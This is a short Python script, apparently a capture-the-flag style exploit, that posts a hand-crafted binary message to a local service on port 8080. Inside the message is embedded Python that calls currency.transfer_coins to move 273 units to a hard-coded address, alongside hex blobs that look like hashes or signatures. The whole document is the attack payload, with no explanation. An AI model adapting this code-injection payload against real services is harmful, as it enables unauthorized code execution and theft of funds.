import requests

requests.post('http://localhost:8080', b"""\x101P\x01\x01\x03$\x941\x01\x82\x0b\xff\x103@\x02Qh\x01\x02-@\x021\x05\x02\x021!\x8a\x03\xffed190619\x1521c593a9d16875ca660b57aa5e45c811c8cf7af0cfcbd23faa52cbcdimport currency\ncurrency.transfer_coins('20da05fdba92449732b3871cc542a058075446fedb41430ee882e99f9091cc4d', 273)\x00\x011\x05\x02\x011\x11\x02\x04\xff41714431\x137b257b5aaf82d696d55a7fb562bc444d14e81634f025cc4ada0f638194a78c69f0dc182e165562cbeb3a1e574c81c5306851d1558ef8cb0f408e6eee3a3001025c15d422884ae7c8b3b38d0f""")